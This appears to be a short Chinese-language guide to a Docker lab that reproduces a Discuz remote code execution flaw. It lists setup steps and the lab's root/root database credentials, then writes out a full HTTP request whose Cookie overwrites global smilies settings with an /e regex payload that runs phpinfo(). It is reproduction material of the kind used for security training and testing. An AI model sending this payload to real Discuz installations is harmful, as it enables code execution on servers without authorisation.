启动靶场：
```
docker compose up -d
```
安装Discuz：
```
http://localhost:18080/install
```
数据库地址:`db`
数据库名：`discuz`
数据库账号：`root`
数据库密码：`root`

随便找一个已存在的帖子，并向其发送数据包，并在Cookie中增加payload
```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
```
然后phpinfo()函数就会被执行
